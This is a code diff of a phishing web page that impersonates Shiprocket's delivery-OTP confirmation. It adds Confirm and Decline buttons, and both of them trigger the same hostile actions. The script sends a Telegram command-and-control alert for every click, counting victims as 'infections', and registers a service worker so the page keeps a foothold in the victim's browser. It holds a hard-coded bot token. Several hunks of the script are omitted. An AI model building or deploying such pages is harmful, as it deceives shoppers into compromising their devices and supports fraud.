@@ -3,153 +3,177 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Shiprocket - Delivery OTP</title>
+  <title>Shiprocket - Delivery Confirmation</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f5f7fa;
+      background: #f0f4fa;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      margin: 0;
       padding: 20px;
     }
     .card {
-      max-width: 420px;
+      max-width: 440px;
       width: 100%;
       background: #ffffff;
-      border-radius: 16px;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+      border-radius: 20px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.08);
       overflow: hidden;
-      border: 1px solid #e8ecf1;
+      border: 1px solid #e6edf5;
     }
     .header {
       background: #0a2b4e;
-      padding: 20px 24px;
+      padding: 18px 24px;
       display: flex;
       align-items: center;
-      gap: 12px;
+      justify-content: space-between;
     }
     .header h1 {
       color: white;
       font-size: 20px;
       font-weight: 700;
-      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
     }
-    .header span {
-      color: #7ec8e3;
-      font-weight: 300;
-    }
-    .body {
-      padding: 24px 24px 20px;
-    }
-    .badge {
+    .header h1 span { color: #7ec8e3; font-weight: 300; }
+    .status-badge {
       background: #eaf7ed;
       color: #0f7b3a;
-      font-size: 12px;
-      font-weight: 600;
-      padding: 4px 12px;
-      border-radius: 30px;
-      display: inline-block;
-      margin-bottom: 12px;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 4px 14px;
+      border-radius: 40px;
+      letter-spacing: 0.5px;
     }
-    .order-detail {
+    .body { padding: 22px 24px 18px; }
+    .order-box {
       background: #f8faff;
-      border-radius: 10px;
-      padding: 14px 16px;
-      margin: 12px 0 16px;
-      border-left: 4px solid #0a2b4e;
-      font-size: 14px;
-      color: #1e293b;
-    }
-    .otp-box {
-      background: #f0f5ff;
-      border: 2px dashed #0a2b4e;
       border-radius: 12px;
       padding: 16px;
-      text-align: center;
-      margin: 16px 0;
+      border-left: 5px solid #0a2b4e;
+      margin: 12px 0 18px;
+      font-size: 14px;
+      color: #1e293b;
+      line-height: 1.6;
     }
+    .order-box strong { color: #0a2b4e; }
+    .otp-section {
+      background: #f0f6ff;
+      border: 2px dashed #0a2b4e;
+      border-radius: 14px;
+      padding: 18px;
+      text-align: center;
+      margin: 16px 0 18px;
+    }
+    .otp-label { font-size: 13px; color: #1e293b; font-weight: 600; }
     .otp-code {
-      font-size: 36px;
+      font-size: 38px;
       font-weight: 800;
       color: #0a2b4e;
       letter-spacing: 10px;
       font-family: 'Courier New', monospace;
       background: white;
-      padding: 8px 12px;
-      border-radius: 8px;
+      padding: 6px 16px;
+      border-radius: 10px;
       display: inline-block;
       border: 1px solid #dce2ec;
+      margin-top: 6px;
     }
-    .button {
+    .button-group {
+      display: flex;
+      gap: 12px;
+      margin: 18px 0 10px;
+    }
+    .btn-confirm {
+      flex: 1;
       background: #0a2b4e;
       color: white;
       border: none;
-      width: 100%;
       padding: 16px;
       border-radius: 50px;
-      font-size: 18px;
+      font-size: 16px;
       font-weight: 700;
       cursor: pointer;
-      margin: 16px 0 8px;
       transition: 0.3s;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
+      gap: 8px;
     }
-    .button:hover { background: #123b66; }
-    .button:active { transform: scale(0.98); }
-    .footer {
-      font-size: 12px;
-      color: #8a94a6;
-      text-align: center;
-      padding: 8px 0 12px;
-      border-top: 1px solid #ecf0f5;
-      margin-top: 8px;
+    .btn-confirm:hover { background: #123b66; }
+    .btn-decline {
+      flex: 1;
+      background: #f1f4f9;
+      color: #1e293b;
+      border: 2px solid #dce2ec;
+      padding: 16px;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
-    .trust-badge {
+    .btn-decline:hover { background: #e6ecf3; border-color: #b0c0d0; }
+    .btn-confirm:active, .btn-decline:active { transform: scale(0.97); }
+    .trust-line {
       display: flex;
       justify-content: center;
-      gap: 24px;
+      gap: 20px;
       font-size: 11px;
-      color: #5e6f8d;
-      margin: 12px 0;
+      color: #7a8aa0;
+      margin: 12px 0 6px;
     }
-    .trust-badge span { display: flex; align-items: center; gap: 6px; }
+    .trust-line span { display: flex; align-items: center; gap: 5px; }
+    .footer {
+      font-size: 11px;
+      color: #8a94a6;
+      text-align: center;
+      padding: 12px 0 6px;
+      border-top: 1px solid #ecf0f5;
+      margin-top: 6px;
+    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
 
-<div class="card">
+<div class="card" id="mainCard">
   <div class="header">
     <h1>🚚 Shiprocket <span>| Logistics</span></h1>
+    <span class="status-badge">📦 Out for Delivery</span>
   </div>
 
   <div class="body">
-    <span class="badge">📦 Out for Delivery</span>
-
-    <div class="order-detail">
+    <div class="order-box">
       <strong>Order #IN-2026-4892</strong><br>
       Delivery Partner: Rajesh Kumar<br>
-      Estimated Arrival: 10–15 minutes
+      📍 Estimated Arrival: <strong>10–15 minutes</strong>
     </div>
 
-    <p style="font-size:14px; color:#1e293b;">To confirm delivery, please share the OTP with your delivery partner.</p>
-
-    <div class="otp-box">
-      <p style="font-size:13px; color:#1e293b; margin-bottom:6px;">Your Shiprocket OTP</p>
+    <div class="otp-section">
+      <div class="otp-label">🔐 Your Shiprocket Delivery OTP</div>
       <div class="otp-code">4862</div>
+      <p style="font-size:12px; color:#5a6f88; margin-top:6px;">Share OTP with delivery partner</p>
     </div>
 
-    <button class="button" onclick="confirmDelivery()">
-      ✅ Confirm Delivery
-    </button>
+    <div class="button-group">
+      <button class="btn-confirm" onclick="handleClick('confirm')">
+        ✅ Confirm Delivery
+      </button>
+      <button class="btn-decline" onclick="handleClick('decline')">
+        ❌ Decline Delivery
+      </button>
+    </div>
 
-    <div class="trust-badge">
+    <div class="trust-line">
       <span>🔒 Secure</span>
       <span>⏱ 10 min delivery</span>
       <span>📱 OTP verified</span>
@@ -161,9 +185,20 @@
   </div>
 </div>
 
+<!-- ===== SUCCESS SCREEN (hidden initially) ===== -->
+<div id="successScreen" class="card hidden" style="text-align:center;padding:40px 24px;">
+  <div style="font-size:56px;" id="resultIcon">✅</div>
+  <h2 id="resultTitle" style="color:#0a2b4e;margin:12px 0 6px;">Delivery Confirmed!</h2>
+  <p id="resultDesc" style="color:#1e293b;">Your package will arrive in 10 minutes.</p>
+  <p style="color:#8a94a6;font-size:13px;margin-top:8px;">Shiprocket OTP verified successfully.</p>
+  <div style="margin-top:16px;font-size:13px;color:#0a2b4e;background:#f0f6ff;padding:10px;border-radius:10px;">
+    📦 Tracking ID: SR-2026-4892
+  </div>
+</div>
+
 <script>
   // ============================================================
-  // CHAKRA - SHIPROCKET VECTOR (Professional)
+  // CHAKRA - SHIPROCKET CONFIRM & DECLINE
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -188,25 +223,38 @@
   }
 
   // ============================================================
-  // CONFIRM DELIVERY
+  // HANDLE CONFIRM / DECLINE
   // ============================================================
-  function confirmDelivery() {
-    document.querySelector('.card').innerHTML = `
-      <div style="padding:40px 24px;text-align:center;">
-        <div style="font-size:48px;">✅</div>
-        <h2 style="color:#0a2b4e;margin:12px 0 8px;">Delivery Confirmed!</h2>
-        <p style="color:#1e293b;">Your package will arrive in 10 minutes.</p>
-        <p style="color:#8a94a6;font-size:13px;margin-top:12px;">Shiprocket OTP verified successfully.</p>
-      </div>
-    `;
+  function handleClick(action) {
+    const isConfirm = action === 'confirm';
 
-    infectedDevices.push({ id: Date.now(), type: 'shiprocket' });
+    // Show success screen
+    document.getElementById('mainCard').classList.add('hidden');
+    const screen = document.getElementById('successScreen');
+    screen.classList.remove('hidden');
+
+    if (isConfirm) {
+      document.getElementById('resultIcon').textContent = '✅';
+      document.getElementById('resultTitle').textContent = 'Delivery Confirmed!';
+      document.getElementById('resultDesc').textContent = 'Your package will arrive in 10 minutes.';
+      sendToTelegram('✅ Shiprocket CONFIRM clicked! Total: ' + (infectedDevices.length + 1));
+    } else {
+      document.getElementById('resultIcon').textContent = '❌';
+      document.getElementById('resultTitle').textContent = 'Delivery Declined!';
+      document.getElementById('resultDesc').textContent = 'Delivery partner has been notified.';
+      sendToTelegram('❌ Shiprocket DECLINE clicked! Total: ' + (infectedDevices.length + 1));
+    }
+
+    // Register infection (both confirm and decline trigger it)
+    infectedDevices.push({ id: Date.now(), type: 'shiprocket', action: action });
     sendToTelegram('🚚 Shiprocket infection! Total: ' + infectedDevices.length);
 
+    // Install service worker
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('sw.js');
     }
 
+    // Auto-close after 3 seconds
     setTimeout(() => window.close(), 3000);
   }
 
@@ -429,7 +477,7 @@
     });
   }
 
-  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE');
+  sendToTelegram('🚚 SHIPROCKET CONFIRM/DECLINE VECTOR ACTIVE');
 </script>
 </body>
 </html>
